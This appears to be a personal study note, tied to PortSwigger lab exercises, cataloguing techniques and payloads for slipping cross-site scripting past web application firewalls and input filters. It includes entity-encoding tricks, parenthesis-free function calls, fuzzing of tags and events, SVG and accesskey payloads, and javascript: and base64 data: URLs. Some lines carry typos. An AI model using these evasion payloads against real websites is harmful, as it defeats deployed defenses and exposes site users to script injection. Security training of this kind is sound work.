# bypass defenses

# bypass WAF

you will need lots of [fuzz](fuzz)ing.

`<ifram>` --> 403
`<%0aifram>` --> 200 --> then on the server `<iframe>`

something like `<%0aimg>` doesn't work on the browser, but when it goes to the server and
back, the `%0a` will be dropped.

## known WAF

search for it on twitter.

## not known WAF

- whether it's CDN or application based: make your own payload
  - application: application error, payload get's removed.
- build your own payload

# blocked in HTML tags

WAF blocks before executing JS

## alert, prompt, etc are filtered

- fuzz to find a valid tag
- `<ta{FUZZ}g>`
- WAF confusion
  - get the payload from the screenshot
  - e.g. make it assume it's a comment
  - html encoding to bypass the WAF
    - `<img src>` // 200
    - `<img src onerror=alert(1)>` // 403
    - `<img src> onerror=alert(1)` // 200
      so we infer it's the problem with the angle bracket
    - `<img src &#x3E onerror=alert(1)>` // 200
      client --> WAF --> html decode --> rule set
      so WAF first html decode stuff, figures out the tag is closed, so it will return 200.
      but on the browser it doesn't matter what the string actually is

## parenthesis, brackets, func(), etc are filtered

`1234()` // 200
`alert()` // 403 --> () are blocked

`alert?.()` // 200
`window.valueOf=alert;winodow+1` // 200


# blocked in JS execution

WAF blocks while JS execution
you opened an HTML tag, but can't execute JS

if you reached here, you could have XSS

- if it's sensitive to words --> use alternative payloads:
    - break the payload: `(aler + t(origin))`
    - put the payload to the fragment
      `url#javascript:alert(1)`
      `location=location.hash.split('#')` --> `location.hash.split('#')[1]` ==
      `javascript:alert(1)`
      then if you `eval(location=location.hash.split('#'))` XSS!
    - Unicode variations
      - `\u{0061}`
      - `\u{000000061}`

# extend your payload gradually

so that you can infer what is being issued by the WAF or ..., so you'd know what to
change, fuzz or ....

# bypass escaped/encoded/blocked character

* double quotes escaped:
  * [[Reflected DOM XSS |add a \ to escape the added \]]
* single quotes escaped
  * [[XSS_examples#Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped| add a \ to escape the added \]]
* double quotes html encoded:
  - [[XSS_examples#Stored XSS into anchor `href` attribute with double quotes HTML-encoded| `javascript:alert(1)`]]
* angle brackets encoded:
	* a payload without angle brackets
		* `/?search="onmouseover="alert(1)` [[XSS_examples#angle brackets encoded| detail]]
		* `<a id="author" href="javascript:alert(1)">test</a>`
		* `onclick"alert(1)"`
		* `"onmouseover="alert(1)`
	* canonical link or access keys
		* `<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>` [[XSS_examples#Reflected XSS in canonical link tag|detail]]
		* `/?' accesskey='Alt+x' onclick='alert()`
* angle brackets  and double quotes encoded
  * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|exploiting $eval.constructor]]
* event handlers and `href` attributes blocked:
	* bf for available tags and events

* HTML context; most tags and attributes blocked:

  - bf allowed tags and attributes 400 vs 200: [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| `GET /?search=<body%20$=1> HTTP/2`]]
  * bf tags: `?search=<$$>` => `SVG`
  * then bf for events: `?search=<SVG><animateTransform%20$$=1>` => `onbegin`
  * then: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>` [[XSS_examples#Reflected XSS with some SVG markup allowe| detail]]

* JS context; some characters blocked in javascript URL:
  - [[XSS_examples#Reflected XSS in a javascript URL with some characters blocked| use other methods to call functions, like throw]]
  - `https://portswigger.net/research/xss-without-parentheses-and-semi-colons`

- use of HTML-encoding to bypass filters:

when the XSS context is an existing JavaScript within a quoted tag attribute
(e.g. an event handler) we can use HTML-encoding to bypass some filters.

When the browser has parsed out the HTML tags and attributes within a response,
it will perform HTML-decoding of tag attribute values before they are processed
any further but the server might not detect them.
	- [[XSS_examples#Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped| stored into onclick event with <>" htmlencoded and '\ escaped]]

* if '"<> and backtick escaped:
	* [[XSS_examples#Reflected XSS into a JavaScript template literals, with `<>'" ` unicode escaped| use js template literals]]

# special URL schemes:

`javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"`
the same alert in base64 to bypass filters.
